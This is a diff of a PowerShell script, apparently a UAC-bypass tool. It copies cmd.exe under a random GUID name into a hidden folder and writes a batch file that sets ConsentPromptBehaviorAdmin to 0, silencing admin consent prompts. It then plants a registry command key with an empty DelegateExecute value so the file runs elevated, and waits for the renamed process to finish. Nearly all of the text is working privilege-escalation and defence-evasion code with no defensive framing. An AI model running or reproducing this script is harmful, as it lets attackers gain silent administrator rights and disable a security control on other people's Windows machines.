@@ -24,39 +24,38 @@ try {
     exit
 }
 
-# Generate a unique name for a copied PowerShell executable
-$uniqueExeNamePowershell = [guid]::NewGuid().ToString()
-$fullUniqueExePowershell = $uniqueExeNamePowershell + ".exe"
-$destinationPathPowershell = Join-Path -Path $hiddenFolderPath -ChildPath $fullUniqueExePowershell
+# Generate a unique name for the copied CMD executable
+$uniqueExeNameCmd = [guid]::NewGuid().ToString()
+$fullUniqueExeCmd = $uniqueExeNameCmd + ".exe"
+$destinationPathCmd = Join-Path -Path $hiddenFolderPath -ChildPath $fullUniqueExeCmd
 
 try {
-    # Copy PowerShell.exe to the hidden folder with a unique name
-    $sourcePowershellPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
-    if (Test-Path $sourcePowershellPath) {
-        Copy-Item -Path $sourcePowershellPath -Destination $destinationPathPowershell -Force
-        Write-Host "PowerShell executable copied to: $destinationPathPowershell"
+    # Copy cmd.exe to the hidden folder with a unique name
+    $sourceCmdPath = "C:\Windows\System32\cmd.exe"
+    if (Test-Path $sourceCmdPath) {
+        Copy-Item -Path $sourceCmdPath -Destination $destinationPathCmd -Force
+        Write-Host "CMD executable copied to: $destinationPathCmd"
     } else {
-        Write-Error "Source PowerShell executable not found at $sourcePowershellPath. Exiting script."
+        Write-Error "Source CMD executable not found at $sourceCmdPath. Exiting script."
         exit
     }
 } catch {
-    Write-Error "Failed to copy PowerShell executable. Exiting script."
+    Write-Error "Failed to copy CMD executable. Exiting script."
     exit
 }
 
-# Define the commands to execute with elevated privileges
+# Define the command to execute in the batch script
 $CommandsToExecute = @"
-# Define your commands here
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
 "@
 
-# Write the commands to a script file in the hidden folder
-$scriptPath = Join-Path -Path $hiddenFolderPath -ChildPath "script.ps1"
+# Write the commands to a batch script file in the hidden folder
+$batchScriptPath = Join-Path -Path $hiddenFolderPath -ChildPath "script.bat"
 try {
-    $CommandsToExecute | Out-File -FilePath $scriptPath -Encoding UTF8
-    Write-Host "Script file created at: $scriptPath"
+    $CommandsToExecute | Out-File -FilePath $batchScriptPath -Encoding ASCII
+    Write-Host "Batch script created at: $batchScriptPath"
 } catch {
-    Write-Error "Failed to create script file. Exiting script."
+    Write-Error "Failed to create batch script. Exiting script."
     exit
 }
 
@@ -67,8 +66,8 @@ try {
     # Create the registry key and set required properties
     New-Item -Path $regKeyPath -Force | Out-Null
     New-ItemProperty -Path $regKeyPath -Name "DelegateExecute" -Value "" -Force | Out-Null
-    # Define the command to execute the script file with hidden window
-    $command = "$destinationPathPowershell -WindowStyle Hidden -File `"$scriptPath`""
+    # Define the command to execute the batch script with hidden window
+    $command = "$destinationPathCmd /c `"$batchScriptPath`""
     Set-ItemProperty -Path $regKeyPath -Name "(default)" -Value $command -Force
     Write-Host "Registry key created and command set to: $command"
 } catch {
@@ -91,15 +90,15 @@ try {
     exit
 }
 
-# Dynamic wait for the PowerShell process to complete
+# Dynamic wait for the CMD process to complete
 try {
-    $isPowershellRunning = $true
-    Write-Host "Waiting for the PowerShell process to complete..."
-    while ($isPowershellRunning) {
-        $process = Get-Process -Name $uniqueExeNamePowershell -ErrorAction SilentlyContinue
+    $isCmdRunning = $true
+    Write-Host "Waiting for the CMD process to complete..."
+    while ($isCmdRunning) {
+        $process = Get-Process -Name $uniqueExeNameCmd -ErrorAction SilentlyContinue
         if ($process -eq $null) {
-            $isPowershellRunning = $false
-            Write-Host "PowerShell process completed."
+            $isCmdRunning = $false
+            Write-Host "CMD process completed."
         }
         Start-Sleep -Seconds 3
     }
